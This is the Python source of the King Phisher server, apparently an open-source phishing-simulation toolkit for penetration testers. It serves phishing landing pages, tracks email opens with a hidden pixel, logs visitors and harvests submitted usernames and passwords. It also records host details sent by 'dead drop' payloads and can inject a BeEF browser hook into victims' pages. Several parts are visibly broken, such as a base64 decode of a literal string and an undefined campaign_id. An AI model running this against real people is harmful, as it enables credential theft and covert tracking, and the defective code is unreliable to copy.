#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  king_phisher/server/server.py
#
#  Redistribution and use in source and binary forms, with or without
#  modification, are permitted provided that the following conditions are
#  met:
#
#  * Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
#  * Redistributions in binary form must reproduce the above
#    copyright notice, this list of conditions and the following disclaimer
#    in the documentation and/or other materials provided with the
#    distribution.
#  * Neither the name of the project nor the names of its
#    contributors may be used to endorse or promote products derived from
#    this software without specific prior written permission.
#
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
#  "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
#  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
#  A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
#  OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
#  SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
#  LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
#  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
#  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#

import base64
import binascii
import ipaddress
import json
import logging
import os
import shutil
import socket
import threading

from king_phisher import errors
from king_phisher import find
from king_phisher import geoip
from king_phisher import sms
from king_phisher import templates
from king_phisher import utilities
from king_phisher import xor
from king_phisher.server import authenticator
from king_phisher.server import pages
from king_phisher.server import server_rpc
from king_phisher.server.database import manager as db_manager
from king_phisher.server.database import models as db_models
from king_phisher.third_party.AdvancedHTTPServer import *

import jinja2
from smoke_zephyr import job

make_uid = lambda: utilities.random_string(24)

def build_king_phisher_server(config, ServerClass=None, HandlerClass=None):
	"""
	Build a server from a provided configuration instance. If *ServerClass* or
	*HandlerClass* is specified, then the object must inherit from the
	corresponding KingPhisherServer base class.

	:param config: Configuration to retrieve settings from.
	:type config: :py:class:`smoke_zephyr.configuration.Configuration`
	:param ServerClass: Alternative server class to use.
	:type ServerClass: :py:class:`.KingPhisherServer`
	:param HandlerClass: Alternative handler class to use.
	:type HandlerClass: :py:class:`.KingPhisherRequestHandler`
	:return: A configured server instance.
	:rtype: :py:class:`.KingPhisherServer`
	"""
	logger = logging.getLogger('KingPhisher.Server.build')
	ServerClass = (ServerClass or KingPhisherServer)
	HandlerClass = (HandlerClass or KingPhisherRequestHandler)
	# set config defaults
	if not config.has_option('server.secret_id'):
		config.set('server.secret_id', make_uid())
	address = (config.get('server.address.host'), config.get('server.address.port'))
	ssl_certfile = None
	ssl_keyfile = None
	if config.has_option('server.ssl_cert'):
		ssl_certfile = config.get('server.ssl_cert')
		ssl_keyfile = config.get_if_exists('server.ssl_key')
	try:
		server = ServerClass(config, HandlerClass, address=address, ssl_certfile=ssl_certfile, ssl_keyfile=ssl_keyfile)
	except socket.error as error:
		error_number, error_message = error.args
		if error_number == 98:
			logger.critical("failed to bind server to address {0}:{1} (socket error #98)".format(*address))
		raise errors.KingPhisherError("socket error #{0} ({1})".format((error_number or 'NOT-SET'), error_message))
	if config.has_option('server.server_header'):
		server.server_version = config.get('server.server_header')
	return server

class KingPhisherRequestHandler(server_rpc.KingPhisherRequestHandlerRPC, AdvancedHTTPServerRequestHandler):
	def __init__(self, *args, **kwargs):
		# this is for attribute documentation
		self.config = None
		"""A reference to the main server instance :py:attr:`.KingPhisherServer.config`."""
		self.path = None
		"""The resource path of the current HTTP request."""
		super(KingPhisherRequestHandler, self).__init__(*args, **kwargs)

	def install_handlers(self):
		self.logger = logging.getLogger('KingPhisher.Server.RequestHandler')
		super(KingPhisherRequestHandler, self).install_handlers()
		self.config = self.server.config
		regex_prefix = '^'
		if self.config.get('server.vhost_directories'):
			regex_prefix += '[\w\.\-]+\/'
		self.handler_map[regex_prefix + 'kpdd$'] = self.handle_deaddrop_visit
		self.handler_map[regex_prefix + 'kp\\.js$'] = self.handle_javascript_hook

		tracking_image = self.config.get('server.tracking_image')
		tracking_image = tracking_image.replace('.', '\\.')
		self.handler_map[regex_prefix + tracking_image + '$'] = self.handle_email_opened

	def issue_alert(self, alert_text, campaign_id):
		"""
		Send an SMS alert. If no *campaign_id* is specified all users
		with registered SMS information will receive the alert otherwise
		only users subscribed to the campaign specified.

		:param str alert_text: The message to send to subscribers.
		:param int campaign_id: The campaign subscribers to send the alert to.
		"""
		session = db_manager.Session()
		campaign = db_manager.get_row_by_id(session, db_models.Campaign, campaign_id)

		if '{campaign_name}' in alert_text:
			alert_text = alert_text.format(campaign_name=campaign.name)
		for subscription in campaign.alert_subscriptions:
			user = subscription.user
			carrier = user.phone_carrier
			number = user.phone_number
			if carrier == None or number == None:
				self.server.logger.warning("skipping alert because user {0} has missing information".format(user.id))
				continue
			self.server.logger.debug("sending alert SMS message to {0} ({1})".format(number, carrier))
			sms.send_sms(alert_text, number, carrier, 'donotreply@kingphisher.local')
		session.close()

	def adjust_path(self):
		"""Adjust the :py:attr:`~.KingPhisherRequestHandler.path` attribute based on multiple factors."""
		self.request_path = self.path.split('?', 1)[0]
		if not self.config.get('server.vhost_directories'):
			return
		if not self.vhost:
			raise errors.KingPhisherAbortRequestError()
		if self.vhost in ['localhost', '127.0.0.1'] and self.client_address[0] != '127.0.0.1':
			raise errors.KingPhisherAbortRequestError()
		self.path = '/' + self.vhost + self.path

	def _do_http_method(self, *args, **kwargs):
		if self.command != 'RPC':
			self.adjust_path()
		http_method_handler = getattr(super(KingPhisherRequestHandler, self), 'do_' + self.command)
		self.server.throttle_semaphore.acquire()
		try:
			http_method_handler(*args, **kwargs)
		except errors.KingPhisherAbortRequestError:
			self.respond_not_found()
		finally:
			self.server.throttle_semaphore.release()
	do_GET = _do_http_method
	do_HEAD = _do_http_method
	do_POST = _do_http_method
	do_RPC = _do_http_method

	def get_query_parameter(self, parameter):
		"""
		Get a parameter from the current request's query information.

		:param str parameter: The parameter to retrieve the value for.
		:return: The value of it exists.
		:rtype: str
		"""
		return self.query_data.get(parameter, [None])[0]

	def get_template_vars_client(self):
		"""
		Build a dictionary of variables for a client with an associated
		campaign.

		:return: The client specific template variables.
		:rtype: dict
		"""
		if not self.message_id:
			return
		visit_count = 0
		result = None
		if self.message_id == self.config.get('server.secret_id'):
			result = ['aliddle@wonderland.com', 'Wonderland Inc.', 'Alice', 'Liddle', 0]
		elif self.message_id:
			session = db_manager.Session()
			message = db_manager.get_row_by_id(session, db_models.Message, self.message_id)
			if message:
				visit_count = len(message.visits)
				result = [message.target_email, message.company_name, message.first_name, message.last_name, message.trained]
			session.close()
		if not result:
			return
		client_vars = {}
		client_vars['email_address'] = result[0]
		client_vars['company_name'] = result[1]
		client_vars['first_name'] = result[2]
		client_vars['last_name'] = result[3]
		client_vars['is_trained'] = result[4]
		client_vars['message_id'] = self.message_id
		client_vars['visit_count'] = visit_count
		if self.visit_id:
			client_vars['visit_id'] = self.visit_id
		else:
			# if the visit_id is not set then this is a new visit so increment the count preemptively
			client_vars['visit_count'] += 1
		return client_vars

	def custom_authentication(self, username, password):
		return self.server.forked_authenticator.authenticate(username, password)

	def check_authorization(self):
		# don't require authentication for non-RPC requests
		if self.command != 'RPC':
			return True
		if ipaddress.ip_address(self.client_address[0]).is_loopback:
			return super(KingPhisherRequestHandler, self).check_authorization()
		return False

	@property
	def campaign_id(self):
		"""
		The campaign id that is associated with the current request's
		visitor. This is retrieved by looking up the
		:py:attr:`~.KingPhisherRequestHandler.message_id` value in the
		database. If no campaign is associated, this value is None.
		"""
		if hasattr(self, '_campaign_id'):
			return self._campaign_id
		self._campaign_id = None
		if self.message_id and self.message_id != self.config.get('server.secret_id'):
			session = db_manager.Session()
			message = db_manager.get_row_by_id(session, db_models.Message, self.message_id)
			if message:
				self._campaign_id = message.campaign_id
			session.close()
		return self._campaign_id

	@property
	def message_id(self):
		"""
		The message id that is associated with the current request's
		visitor. This is retrieved by looking at an 'id' parameter in the
		query and then by checking the
		:py:attr:`~.KingPhisherRequestHandler.visit_id` value in the
		database. If no message id is associated, this value is None. The
		resulting value will be either a confirmed valid value, or the value
		of the configurations server.secret_id for testing purposes.
		"""
		if hasattr(self, '_message_id'):
			return self._message_id
		self._message_id = None
		msg_id = self.get_query_parameter('id')
		if msg_id == self.config.get('server.secret_id'):
			self._message_id = msg_id
			return self._message_id
		session = db_manager.Session()
		if msg_id and db_manager.get_row_by_id(session, db_models.Message, msg_id):
			self._message_id = msg_id
		elif self.visit_id:
			visit = db_manager.get_row_by_id(session, db_models.Visit, self.visit_id)
			self._message_id = visit.message_id
		session.close()
		return self._message_id

	@property
	def visit_id(self):
		"""
		The visit id that is associated with the current request's
		visitor. This is retrieved by looking for the King Phisher cookie.
		If no cookie is set, this value is None.
		"""
		if hasattr(self, '_visit_id'):
			return self._visit_id
		self._visit_id = None
		kp_cookie_name = self.config.get('server.cookie_name')
		if kp_cookie_name in self.cookies:
			value = self.cookies[kp_cookie_name].value
			session = db_manager.Session()
			if db_manager.get_row_by_id(session, db_models.Visit, value):
				self._visit_id = value
			session.close()
		return self._visit_id

	@property
	def vhost(self):
		"""The value of the Host HTTP header."""
		return self.headers.get('host', '').split(':')[0]

	def respond_file(self, file_path, attachment=False, query={}):
		self._respond_file_check_id()
		file_path = os.path.abspath(file_path)
		file_ext = os.path.splitext(file_path)[1][1:]
		if attachment or not file_ext in ['hta', 'htm', 'html', 'txt']:
			self._respond_file_raw(file_path, attachment)
			return
		try:
			template = self.server.template_env.get_template(os.path.relpath(file_path, self.server.serve_files_root))
		except jinja2.exceptions.TemplateSyntaxError as error:
			self.server.logger.error("jinja2 syntax error in template {0}:{1} {2}".format(error.filename, error.lineno, error.message))
			raise errors.KingPhisherAbortRequestError()
		except jinja2.exceptions.TemplateError:
			raise errors.KingPhisherAbortRequestError()

		template_vars = {
			'client': {
				'address': self.client_address[0]
			},
			'request': {
				'command': self.command,
				'cookies': dict((c[0], c[1].value) for c in self.cookies.items()),
				'parameters': dict(zip(self.query_data.keys(), map(self.get_query_parameter, self.query_data.keys())))
			},
			'server': {
				'hostname': self.vhost,
				'address': self.connection.getsockname()[0]
			}
		}
		template_vars.update(self.server.template_env.standard_variables)
		template_vars['client'].update(self.get_template_vars_client() or {})
		try:
			template_data = template.render(template_vars)
		except jinja2.TemplateError as error:
			self.server.logger.error("jinja2 template {0} render failed: {1} {2}".format(template.filename, error.__class__.__name__, error.message))
			raise errors.KingPhisherAbortRequestError()

		fs = os.stat(template.filename)
		mime_type = self.guess_mime_type(file_path)
		if mime_type.startswith('text'):
			mime_type = mime_type + '; charset=utf-8'
		self.send_response(200)
		self.send_header('Content-Type', mime_type)
		self.send_header('Content-Length', str(len(template_data)))
		self.send_header('Last-Modified', self.date_time_string(fs.st_mtime))

		try:
			self.handle_page_visit()
		except Exception as error:
			self.server.logger.error('handle_page_visit raised error: ' + error.__class__.__name__)

		self.end_headers()
		self.wfile.write(template_data.encode('utf-8', 'ignore'))
		return

	def _respond_file_raw(self, file_path, attachment):
		try:
			file_obj = open(file_path, 'rb')
		except IOError:
			raise errors.KingPhisherAbortRequestError()
		fs = os.fstat(file_obj.fileno())
		self.send_response(200)
		self.send_header('Content-Type', self.guess_mime_type(file_path))
		self.send_header('Content-Length', str(fs[6]))
		if attachment:
			file_name = os.path.basename(file_path)
			self.send_header('Content-Disposition', 'attachment; filename=' + file_name)
		self.send_header('Last-Modified', self.date_time_string(fs.st_mtime))
		self.end_headers()
		shutil.copyfileobj(file_obj, self.wfile)
		file_obj.close()
		return

	def _respond_file_check_id(self):
		if not self.config.get('server.require_id'):
			return
		if self.message_id == self.config.get('server.secret_id'):
			return
		# a valid campaign_id requires a valid message_id
		if not self.campaign_id:
			self.server.logger.warning('denying request due to lack of a valid id')
			raise errors.KingPhisherAbortRequestError()

		session = db_manager.Session()
		campaign = db_manager.get_row_by_id(session, db_models.Campaign, self.campaign_id)
		query = session.query(db_models.LandingPage)
		query = query.filter_by(campaign_id=self.campaign_id, hostname=self.vhost)
		if query.count() == 0:
			self.server.logger.warning('denying request with not found due to invalid hostname')
			session.close()
			raise errors.KingPhisherAbortRequestError()
		if campaign.reject_after_credentials and self.visit_id == None:
			query = session.query(db_models.Credential)
			query = query.filter_by(message_id=self.message_id)
			if query.count():
				self.server.logger.warning('denying request because credentials were already harvested')
				session.close()
				raise errors.KingPhisherAbortRequestError()
		session.close()
		return

	def respond_not_found(self):
		self.send_response(404, 'Resource Not Found')
		self.send_header('Content-Type', 'text/html')
		self.end_headers()
		page_404 = find.find_data_file('error_404.html')
		if page_404:
			with open(page_404, 'rb') as page_404:
				shutil.copyfileobj(page_404, self.wfile)
		else:
			self.wfile.write('Resource Not Found\n')
		return

	def respond_redirect(self, location='/'):
		location = location.lstrip('/')
		if self.config.get('server.vhost_directories') and location.startswith(self.vhost):
			location = location[len(self.vhost):]
		if not location.startswith('/'):
			location = '/' + location
		super(KingPhisherRequestHandler, self).respond_redirect(location)

	def handle_deaddrop_visit(self, query):
		self.send_response(200)
		self.end_headers()

		data = self.get_query_parameter('token')
		if not data:
			self.logger.warning('dead drop request received with no \'token\' parameter')
			return
		try:
			data = base64.b64decode('base64')
		except binascii.Error:
			self.logger.error('dead drop request received with invalid \'token\' data')
			return
		data = xor.xor_decode(data)
		try:
			data = json.loads(data)
		except ValueError:
			self.logger.error('dead drop request received with invalid \'token\' data')
			return

		session = db_manager.Session()
		deployment = db_manager.get_row_by_id(session, db_models.DeaddropDeployment, data.get('deaddrop_id'))
		if not deployment:
			session.close()
			self.logger.error('dead drop request received for an unknown campaign')
			return

		local_username = data.get('local_username')
		local_hostname = data.get('local_hostname')
		if local_username == None or local_hostname == None:
			session.close()
			self.logger.error('dead drop request received with missing data')
			return
		local_ip_addresses = data.get('local_ip_addresses')
		if isinstance(local_ip_addresses, (list, tuple)):
			local_ip_addresses = ' '.join(local_ip_addresses)

		query = session.query(db_models.DeaddropConnection)
		query = query.filter_by(id=deployment.id, local_username=local_username, local_hostname=local_hostname)
		connection = query.first()
		if connection:
			connection.visit_count += 1
		else:
			connection = db_models.Connection(campaign_id=deployment.campaign_id, deployment_id=deployment.id)
			connection.visitor_ip = self.client_address
			connection.local_username = local_username
			connection.local_hostname = local_hostname
			connection.local_ip_addresses = local_ip_addresses
			session.add(connection)
		session.commit()

		query = session.query(db_models.DeaddropConnection)
		query = query.filter_by(campaign_id=deployment.campaign_id)
		visit_count = query.count()
		session.close()
		if visit_count > 0 and ((visit_count in [1, 3, 5]) or ((visit_count % 10) == 0)):
			alert_text = "{0} deaddrop connections reached for campaign: {{campaign_name}}".format(visit_count)
			self.server.job_manager.job_run(self.issue_alert, (alert_text, campaign_id))
		return

	def handle_email_opened(self, query):
		# image size: 49 Bytes
		img_data = '47494638396101000100910000000000ffffffffffff00000021f90401000002'
		img_data += '002c00000000010001000002025401003b'
		img_data = binascii.a2b_hex(img_data)
		self.send_response(200)
		self.send_header('Content-Type', 'image/gif')
		self.send_header('Content-Length', str(len(img_data)))
		self.end_headers()
		self.wfile.write(img_data)

		msg_id = self.get_query_parameter('id')
		if not msg_id:
			return
		session = db_manager.Session()
		query = session.query(db_models.Message)
		query = query.filter_by(id=msg_id, opened=None)
		message = query.first()
		if message:
			message.opened = db_models.current_timestamp()
			session.commit()
		session.close()

	def handle_javascript_hook(self, query):
		kp_hook_js = find.find_data_file('javascript_hook.js')
		if not kp_hook_js:
			self.respond_not_found()
			return
		with open(kp_hook_js, 'r') as kp_hook_js:
			javascript = kp_hook_js.read()
		if self.config.has_option('beef.hook_url'):
			javascript += "\nloadScript('{0}');\n\n".format(self.config.get('beef.hook_url'))
		self.send_response(200)
		self.send_header('Content-Type', 'text/javascript')
		self.send_header('Pragma', 'no-cache')
		self.send_header('Cache-Control', 'no-cache')
		self.send_header('Expires', '0')
		self.send_header('Access-Control-Allow-Origin', '*')
		self.send_header('Access-Control-Allow-Methods', 'POST, GET')
		self.send_header('Content-Length', str(len(javascript)))
		self.end_headers()
		if not isinstance(javascript, bytes):
			javascript = javascript.encode('utf-8')
		self.wfile.write(javascript)
		return

	def handle_page_visit(self):
		if not self.message_id:
			return
		if self.message_id == self.config.get('server.secret_id'):
			return
		if not self.campaign_id:
			return
		self.logger.info("handling a page visit for campaign id: {0} from IP address: {1}".format(self.campaign_id, self.client_address[0]))
		session = db_manager.Session()
		campaign = db_manager.get_row_by_id(session, db_models.Campaign, self.campaign_id)
		message = db_manager.get_row_by_id(session, db_models.Message, self.message_id)

		if message.opened == None and self.config.get_if_exists('server.set_message_opened_on_visit', True):
			message.opened = db_models.current_timestamp()

		set_new_visit = True
		visit_id = make_uid()
		if self.visit_id:
			set_new_visit = False
			visit_id = self.visit_id
			query = session.query(db_models.LandingPage)
			query = query.filter_by(campaign_id=self.campaign_id, hostname=self.vhost, page=self.request_path[1:])
			if query.count():
				visit = db_manager.get_row_by_id(session, db_models.Visit, visit_id)
				if visit.message_id == self.message_id:
					visit.visit_count += 1
				else:
					set_new_visit = True

		if set_new_visit:
			kp_cookie_name = self.config.get('server.cookie_name')
			cookie = "{0}={1}; Path=/; HttpOnly".format(kp_cookie_name, visit_id)
			self.send_header('Set-Cookie', cookie)
			visit = db_models.Visit(id=visit_id, campaign_id=self.campaign_id, message_id=self.message_id)
			visit.visitor_ip = self.client_address[0]
			visit.visitor_details = self.headers.get('user-agent', '')
			session.add(visit)
			visit_count = len(campaign.visits)
			if visit_count > 0 and ((visit_count in [1, 10, 25]) or ((visit_count % 50) == 0)):
				alert_text = "{0} vists reached for campaign: {{campaign_name}}".format(visit_count)
				self.server.job_manager.job_run(self.issue_alert, (alert_text, self.campaign_id))

		self._handle_page_visit_creds(session, visit_id)
		trained = self.get_query_parameter('trained')
		if isinstance(trained, str) and trained.lower() in ['1', 'true', 'yes']:
			message.trained = True
		session.commit()
		session.close()

	def _handle_page_visit_creds(self, session, visit_id):
		username = None
		for pname in ['username', 'user', 'u']:
			username = (self.get_query_parameter(pname) or self.get_query_parameter(pname.title()) or self.get_query_parameter(pname.upper()))
			if username:
				break
		if not username:
			return
		password = None
		for pname in ['password', 'pass', 'p']:
			password = (self.get_query_parameter(pname) or self.get_query_parameter(pname.title()) or self.get_query_parameter(pname.upper()))
			if password:
				break
		password = (password or '')
		cred_count = 0
		query = session.query(db_models.Credential)
		query = query.filter_by(message_id=self.message_id, username=username, password=password)
		if query.count() == 0:
			cred = db_models.Credential(campaign_id=self.campaign_id, message_id=self.message_id, visit_id=visit_id)
			cred.username = username
			cred.password = password
			session.add(cred)
			campaign = db_manager.get_row_by_id(session, db_models.Campaign, self.campaign_id)
			cred_count = len(campaign.credentials)
		if cred_count > 0 and ((cred_count in [1, 5, 10]) or ((cred_count % 25) == 0)):
			alert_text = "{0} credentials submitted for campaign: {{campaign_name}}".format(cred_count)
			self.server.job_manager.job_run(self.issue_alert, (alert_text, self.campaign_id))

class KingPhisherServer(AdvancedHTTPServer):
	"""
	The main HTTP and RPC server for King Phisher.
	"""
	def __init__(self, config, *args, **kwargs):
		"""
		:param config: Configuration to retrieve settings from.
		:type config: :py:class:`smoke_zephyr.configuration.Configuration`
		"""
		self.logger = logging.getLogger('KingPhisher.Server')
		super(KingPhisherServer, self).__init__(*args, **kwargs)
		self.config = config
		"""A :py:class:`~smoke_zephyr.configuration.Configuration` instance used as the main King Phisher server configuration."""
		self.serve_files = True
		self.serve_files_root = config.get('server.web_root')
		self.serve_files_list_directories = False
		self.serve_robots_txt = True
		self.database_engine = db_manager.init_database(config.get('server.database'))

		self.http_server.config = config
		self.http_server.throttle_semaphore = threading.Semaphore()
		self.http_server.forked_authenticator = authenticator.ForkedAuthenticator(required_group=config.get_if_exists('server.authentication.group'))
		self.logger.debug('forked an authenticating process with PID: ' + str(self.http_server.forked_authenticator.child_pid))
		self.job_manager = job.JobManager()
		"""A :py:class:`~smoke_zephyr.job.JobManager` instance for scheduling tasks."""
		self.job_manager.start()
		self.http_server.job_manager = self.job_manager
		loader = jinja2.FileSystemLoader(config.get('server.web_root'))
		global_vars = {}
		if config.has_section('server.page_variables'):
			global_vars = config.get('server.page_variables')
		global_vars['make_csrf_page'] = pages.make_csrf_page
		global_vars['make_redirect_page'] = pages.make_redirect_page
		self.http_server.template_env = templates.BaseTemplateEnvironment(loader=loader, global_vars=global_vars)
		self.__geoip_db = geoip.init_database(config.get('server.geoip.database'))

		self.__is_shutdown = threading.Event()
		self.__is_shutdown.clear()

	def shutdown(self, *args, **kwargs):
		"""
		Request that the server perform any cleanup necessary and then
		shut down. This will wait for the server to stop before it
		returns.
		"""
		if self.__is_shutdown.is_set():
			return
		self.logger.warning('processing shutdown request')
		super(KingPhisherServer, self).shutdown(*args, **kwargs)
		self.http_server.forked_authenticator.stop()
		self.logger.debug('stopped the forked authenticator process')
		self.job_manager.stop()
		self.__geoip_db.close()
		self.__is_shutdown.set()
